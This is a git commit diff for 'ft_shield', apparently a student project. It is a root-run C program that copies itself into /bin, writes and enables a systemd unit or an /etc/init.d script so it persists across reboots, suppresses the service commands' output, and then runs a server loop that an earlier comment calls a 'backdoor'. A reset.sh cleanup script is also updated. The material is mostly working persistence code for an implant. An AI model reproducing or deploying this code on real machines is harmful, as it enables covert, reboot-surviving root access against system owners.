c3c3623fa1b6dd1eba54cdb1bc617d252b00820f
Song,ch_ <logoshope.song@gmail.com>
2025-04-14 12:30:27 +0200

    general enhancement and new feature - main task
    main logic for determining init system (systemd/sysvinit)
    - is_systemd function has been changed to get_init_system
    - fixed env variable injection vulnerability (with get_parent function)
    
    sysvinit support (test required)
    - added sysvinit deamonization
    - added sysvinit service script into header file
    - creates sysvinit script in /etc/init.d/ path (default for sysvinit system)
    - updated reset.sh for sysvinit script
    
    small fixes/updates
    - remove undesired output (systemctl) to /dev/null
    - fixed error check for fd
    - service enable for systemd
    
    todo
    - test in sysvinit system
    - enable service after reboot for sysvinit
    
    visible changes: yes

--- ft_shield.c
+++ ft_shield.c
@@ -1,6 +1,74 @@
 #include "ft_shield.h"
 
 
+int get_parent()
+{
+	pid_t ppid = getppid();
+	char cmdline[256];
+	snprintf(cmdline, sizeof(cmdline), "/proc/%d/comm", ppid);
+	FILE *fd = fopen(cmdline, "r");
+	if (fd >= 0)
+	{
+		char parent_proc[256];
+		fgets(parent_proc, sizeof(parent_proc), fd);
+		syslog(LOG_DEBUG, "parent process: %s\n", parent_proc);
+		fclose(fd);
+		if (strncmp(parent_proc, "systemd", 7) == 0) return 1;
+		if (strncmp(parent_proc, "init", 4) == 0) return 2;
+		if (strncmp(parent_proc, "bash", 4) == 0) return 3;
+	}
+	else
+	{
+		return -1;
+	}
+	return 0;
+}
+
+int get_init_system()
+{
+	// depricated since it can only detect if its systemd or not (ignoring sysvinit)
+	// also vulnerable against env variable injection
+	//
+	// if (getenv("INVOCATION_ID"))
+	// {
+	// 	syslog(LOG_INFO, "current process is recognized as systemd\n");
+	// 	return 1;
+	// }
+	// return 0;
+	FILE *fd = fopen("/proc/1/comm", "r");
+	if (fd < 0)
+	{
+		syslog(LOG_ERR, "failed to open file: /proc/1/comm\n");
+		return -1;
+	}
+	char buffer[256];
+	if (fgets(buffer, sizeof(buffer), fd))
+	{
+		if (strncmp(buffer, "systemd", 7) == 0)
+		{
+			syslog(LOG_INFO, "current process is recognized as systemd\n");
+			return 1;
+		}
+		else if (strncmp(buffer, "init", 4) == 0)
+		{
+			syslog(LOG_INFO, "current process is recognized as sysvinit\n");
+			return 2;
+		}
+		else
+		{
+			syslog(LOG_INFO, "current process is using another system (OpenRC?)\n");
+			return 3;
+		}
+	}
+	else
+	{
+		syslog(LOG_ERR, "failed to read file: /proc/1/comm\n");
+		return -1;
+	}
+	fclose(fd);
+	return -2;
+}
+
 void server() {
 	syslog(LOG_INFO, "server started\n");
 	while (1)
@@ -34,16 +102,23 @@ int duplicate(char *exec_path)
 		write(bin, buffer, ret);
 	close(bin);
 	close(usr);
-	syslog(LOG_INFO, "ft_shield duplicated successfully\n");
+	syslog(LOG_INFO, "%s has been duplicated into %s\n", exec_path, BIN_PATH);
 	return (0);
 }
 
 int daemonize()
 {
-	int fd = open(SYSTEMD_PATH"ft_shield.service", O_CREAT | O_TRUNC | O_WRONLY, 0755);
-	if (fd >= 0)
+	syslog(LOG_INFO, "daemonizing\n");
+	int init_system = get_init_system();
+	if (init_system == 1)
 	{
-		syslog(LOG_INFO, "writing an unit: "SYSTEMD_PATH"ft_shield.service\n");
+		syslog(LOG_INFO, "systemd: writing an unit: "SYSTEMD_PATH"ft_shield.service\n");
+		int fd = open(SYSTEMD_PATH"ft_shield.service", O_CREAT | O_TRUNC | O_WRONLY, 0755);
+		if (fd < 0)
+		{
+			syslog(LOG_ERR, "failed to open or create file: "SYSTEMD_PATH"ft_shield.service\n");
+			return -1;
+		}
 		if (write(fd, SYSTEMD_CONFIG, strlen(SYSTEMD_CONFIG)) == -1)
 		{
 			syslog(LOG_ERR, "failed to write systemd service unit\n");
@@ -51,48 +126,31 @@ int daemonize()
 		}
 		chmod(SYSTEMD_PATH"ft_shield.service", 755);
 		syslog(LOG_INFO, "systemd: starting service\n");
-		system("systemctl stop ft_shield");
-		system("systemctl daemon-reload");
-		system("systemctl start ft_shield");
+		system("systemctl stop ft_shield > /dev/null 2>&1");
+		system("systemctl daemon-reload > /dev/null 2>&1");
+		system("systemctl enable ft_shield > /dev/null 2>&1");
+		system("systemctl start ft_shield > /dev/null 2>&1");
 	}
-	else
+	else if (init_system == 2)
 	{
-		// sysVinit
-	}
-}
-
-// unused
-int get_parent()
-{
-	pid_t ppid = getppid();
-	char cmdline[256];
-	snprintf(cmdline, sizeof(cmdline), "/proc/%d/comm", ppid);
-	FILE *f = fopen(cmdline, "r");
-	if (f)
-	{
-		char parent_proc[256];
-		fgets(parent_proc, sizeof(parent_proc), f);
-		syslog(LOG_DEBUG, "parent process: %s\n", parent_proc);
-		fclose(f);
-		if (strncmp(parent_proc, "systemd", 7) == 0) return 1;
-		if (strncmp(parent_proc, "init", 4) == 0) return 2;
-		if (strncmp(parent_proc, "bash", 4) == 0) return 3;
-	}
-	else
-	{
-		return -1;
+		syslog(LOG_INFO, "sysvinit: writing a script: "SYSVINIT_PATH"ft_shield");
+		int fd = open(SYSVINIT_PATH"ft_shield", O_CREAT | O_TRUNC | O_WRONLY, 0755);
+		if (fd < 0)
+		{
+			syslog(LOG_ERR, "failed to open or create file: "SYSVINIT_PATH"ft_shield\n");
+			return -2;
+		}
+		if (write(fd, SYSVINIT_CONFIG, strlen(SYSVINIT_CONFIG)) == -1)
+		{
+			syslog(LOG_ERR, "failed to write sysvinit script\n");
+			return -2;
+		}
+		chmod(SYSVINIT_PATH"ft_shield", 755);
+		syslog(LOG_INFO, "sysvinit: starting service\n");
+		system("update-rc.d ft_shield defaults > /dev/null 2>&1");
+		system("service ft_shield start > /dev/null 2>&1");
 	}
 	return 0;
-}
-
-bool is_systemd()
-{
-	if (getenv("INVOCATION_ID"))
-	{
-		syslog(LOG_INFO, "current process is recognized as systemd\n");
-		return true;
-	}
-	return false;
 }
 
 int main(int argc, char **argv)
@@ -105,7 +163,8 @@ int main(int argc, char **argv)
 		printf("root permission required\n");
 		return (-1);
 	}
-	openlog("ft_shield", LOG_PID | LOG_CONS, LOG_USER); // LOG_PERROR for stdout
+	openlog("ft_shield", LOG_PID | LOG_CONS, LOG_USER);
+	int parent = get_parent();
 	len = readlink("/proc/self/exe", exec_path, sizeof(exec_path) - 1);
 	if (len != -1)
 	{
@@ -117,10 +176,8 @@ int main(int argc, char **argv)
 		syslog(LOG_ERR, "readlink failed\n");
 		return -1;
 	}
-	// syslog(LOG_INFO, "/proc/self/exe: %s", exec_path);
-	if (!is_systemd())
+	if (parent != 1 && parent != 2) // systemd && sysvinit
 	{
-		// ft_shield.out
 		if (duplicate(exec_path) < 0) // copy binary to /bin directory
 		{
 			syslog(LOG_ERR, "failed to duplicate the program\n");
@@ -134,7 +191,6 @@ int main(int argc, char **argv)
 	}
 	else
 	{
-		// backdoor
 		server();
 	}
 	syslog(LOG_DEBUG, "process end: %s\n", exec_path);
--- reset.sh
+++ reset.sh
@@ -12,10 +12,16 @@
 systemctl disable ft_shield.service
 systemctl stop ft_shield.service
 
+# stop sysvinit service
+service ft_shield stop
+
 # remove systemd service unit
 rm -fr /etc/systemd/system/ft_shield.service
 
 # remove duplicated binary file
 rm -fr /bin/ft_shield
+
+# remove sysvinit service script
+rm -fr /etc/init.d/ft_shield
 
 echo -e "done"
